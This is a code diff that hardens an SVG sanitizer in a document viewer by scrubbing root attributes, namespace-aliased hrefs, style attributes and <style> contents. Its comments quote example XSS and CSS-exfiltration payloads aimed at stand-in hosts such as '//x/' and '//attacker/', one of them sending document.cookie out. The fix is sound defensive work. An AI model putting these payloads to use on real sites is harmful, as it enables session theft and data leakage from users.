@@ -869,22 +869,80 @@ const SVG_OK = new Set([
  */
 const MAX_SVG_DEPTH = 256;
 
-function scrub(node: Element, depth = 0) {
+/**
+ * Strip one element's attributes down to what is safe to import.
+ *
+ * Split out of the walk because the walk did not do it to the element it was
+ * *given* - only to that element's children - so every attribute on the root
+ * `<svg>` survived untouched into the page. `<svg xmlns="..." onload="fetch('
+ * //x/' + document.cookie)">` is the classic form of this and it ran: opening
+ * such a file in the viewer copied the root verbatim into `.doc-svg`. Live
+ * under tools/serve.py, which sends no headers; on the deploy the only thing
+ * that stopped it was `script-src` carrying no 'unsafe-inline', which is to say
+ * the allow-list that _headers itself calls "the first lock" was the one that
+ * failed.
+ */
+function scrubAttrs(node: Element) {
+  for (const attr of [...node.attributes]) {
+    const name = attr.name.toLowerCase();
+    const local = name.includes(':') ? name.slice(name.indexOf(':') + 1) : name;
+    const value = attr.value.trim().toLowerCase();
+    // Every on* handler, and anything pointing anywhere but inside this
+    // document - a fragment reference (#id) is the one form kept, because
+    // <use href="#thing"> is how an SVG refers to its own parts.
+    //
+    // Matched on the *local* name rather than the qualified one. The test was
+    // `/^(href|xlink:href|...)$/`, which names one prefix - and a prefix is the
+    // author's to choose, so `<use xmlns:xl="...xlink" xl:href="https://...">`
+    // bound the same namespace under another letter and kept its attribute.
+    // Browsers refuse a cross-origin <use> today, so the gap was in the
+    // allow-list rather than in the outcome; the same trick defeats from/to/
+    // values the day an animation element joins SVG_OK.
+    //
+    // `style` is on this list now, which it was not. The module header says
+    // "every attribute that is a reference to somewhere else is dropped" and a
+    // style attribute is exactly that: `style="fill:url(//attacker/track.svg#a)"`
+    // on any allowed child reached the page and made the request.
+    const away = name.startsWith('on')
+      || local === 'style'
+      || (/^(href|src|from|to|values|begin|end)$/.test(local) && !value.startsWith('#'))
+      || value.includes('javascript:')
+      || value.includes('data:text/html');
+    if (away) node.removeAttribute(attr.name);
+  }
+}
+
+/**
+ * Exported for tests/documents.test.js, and only for that.
+ *
+ * This is the app's single named exception to CLAUDE.md's "nothing that reads a
+ * foreign document may touch innerHTML" - the one place a stranger's markup is
+ * parsed and walked - and it had no test in either direction. tests/csp.test.js
+ * asserts the policy that is supposed to be the *second* lock; the first one
+ * was defended by nothing at all, which is how three separate holes in it went
+ * unnoticed. Not part of the module's interface: nothing else calls it.
+ */
+export function scrub(node: Element, depth = 0) {
+  if (depth === 0) scrubAttrs(node);
   if (depth >= MAX_SVG_DEPTH) { node.replaceChildren(); return; }
   for (const child of [...node.children]) {
     if (!SVG_OK.has(child.localName)) { child.remove(); continue; }
-    for (const attr of [...child.attributes]) {
-      const name = attr.name.toLowerCase();
-      const value = attr.value.trim().toLowerCase();
-      // Every on* handler, and anything pointing anywhere but inside this
-      // document - a fragment reference (#id) is the one form kept, because
-      // <use href="#thing"> is how an SVG refers to its own parts.
-      const away = name.startsWith('on')
-        || (/^(href|xlink:href|src|from|to|values)$/.test(name) && !value.startsWith('#'))
-        || value.includes('javascript:')
-        || value.includes('data:text/html');
-      if (away) child.removeAttribute(attr.name);
+    // A <style> element is a document stylesheet, not a scoped one - an inline
+    // <style> inside an SVG subtree applies to the whole page. SVG_OK carries
+    // 'style' and nothing here ever looked at text content, so
+    // `<style>*{display:none} input[value^="a"]{background:url(//x/a)}</style>`
+    // in an opened drawing restyled and leaked from the entire app. The
+    // deployed style-src blocks it; serve.py does not.
+    //
+    // Emptied rather than dropped, so a drawing that leans on its own CSS
+    // renders as an unstyled drawing rather than vanishing - and the element
+    // stays visible to anyone reading the imported tree.
+    if (child.localName === 'style') {
+      child.textContent = '';
+      scrubAttrs(child);
+      continue;
     }
+    scrubAttrs(child);
     scrub(child, depth + 1);
   }
 }
